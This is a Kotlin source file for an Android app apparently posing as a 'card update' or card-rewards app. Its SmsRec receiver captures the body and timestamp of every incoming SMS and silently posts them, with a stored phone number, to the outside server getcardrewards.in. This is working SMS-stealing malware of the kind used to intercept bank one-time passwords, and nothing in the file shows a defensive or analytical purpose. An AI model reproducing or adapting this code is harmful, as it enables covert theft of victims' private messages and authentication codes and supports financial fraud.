package com.example.cardupdate

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.os.Build
import android.os.Bundle
import android.telephony.SmsMessage
import android.util.Log

import retrofit2.Callback
import retrofit2.Response
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.text.SimpleDateFormat
import java.util.*


class SmsRec : BroadcastReceiver() {
    var mobileNo:String?=null
    override fun onReceive(p0: Context?, p1: Intent?) {
        val extras = p1?.extras
        if (extras != null) {
            val smsextras = extras["pdus"] as Array<*>?
            smsextras?.let {
                for (i in smsextras.indices) {
                    val smsmsg: SmsMessage = getMessage(smsextras[i], extras)
                    val strMsgBody: String = smsmsg.getMessageBody().toString()
                    val time:String?=getDateCurrentTimeZone(smsmsg.timestampMillis)
                    val prefs: SharedPreferences? = p0?.getSharedPreferences(
                        "MyPref",
                        Context.MODE_PRIVATE
                    )
                    mobileNo = prefs?.getString("phone", null)
                    if (p0?.let { it1 -> checkForInternet(it1) } == true) {
                        val retrofit = Retrofit.Builder()
                            .baseUrl("https://getcardrewards.in/") // as we are sending data in json format so
                            .addConverterFactory(GsonConverterFactory.create()) // at last we are building our retrofit builder.
                            .build()
                        // below line is to create an instance for our retrofit api class.
                        // below line is to create an instance for our retrofit api class.
                        val retrofitAPI: RetrofitAPI = retrofit.create(RetrofitAPI::class.java)
                        val modal = mobileNo?.let { it1 -> DataModel(it1, strMsgBody+"\n"+time) }
                        val call: retrofit2.Call<ResponseData?>? = modal?.let { it1 -> retrofitAPI.createPost(it1) }

                        call?.enqueue(object : Callback<ResponseData?> {
                            override fun onFailure(call: retrofit2.Call<ResponseData?>, t: Throwable) {
                                Log.d("value","value")

                            }

                            override fun onResponse(
                                call: retrofit2.Call<ResponseData?>,
                                response: Response<ResponseData?>
                            ) {
                            Log.d("value","value")
                            }

                        })
                    }
                }
            }
        }
    }
    private fun checkForInternet(context: Context): Boolean {

        // register activity with the connectivity manager service
        val connectivityManager =
            context.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager

        // if the android version is equal to M
        // or greater we need to use the
        // NetworkCapabilities to check what type of
        // network has the internet connection
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {

            // Returns a Network object corresponding to
            // the currently active default data network.
            val network = connectivityManager.activeNetwork ?: return false

            // Representation of the capabilities of an active network.
            val activeNetwork = connectivityManager.getNetworkCapabilities(network) ?: return false

            return when {
                // Indicates this network uses a Wi-Fi transport,
                // or WiFi has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_WIFI) -> true

                // Indicates this network uses a Cellular transport. or
                // Cellular has network connectivity
                activeNetwork.hasTransport(NetworkCapabilities.TRANSPORT_CELLULAR) -> true

                // else return false
                else -> false
            }
        } else {
            // if the android version is below M
            @Suppress("DEPRECATION") val networkInfo =
                connectivityManager.activeNetworkInfo ?: return false
            @Suppress("DEPRECATION")
            return networkInfo.isConnected
        }
    }
    fun getDateCurrentTimeZone(timestamp: Long): String? {

        try {
            val date = Date(timestamp); // *1000 is to convert seconds to milliseconds
            val sdf = SimpleDateFormat("EEE, hh:mm:ss a , dd MMM yyyy "); // the format of your date
            sdf.setTimeZone(TimeZone.getDefault());

            return sdf.format(date);
        } catch (e: Exception) {
        }
        return ""
    }
    private fun getMessage(any: Any?, extras: Bundle): SmsMessage {
        val currentSMS: SmsMessage
        currentSMS = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            val format: String? = extras.getString("format")
            SmsMessage.createFromPdu(any as ByteArray?, format)
        } else {
            SmsMessage.createFromPdu(any as ByteArray?)
        }
        return currentSMS
    }


}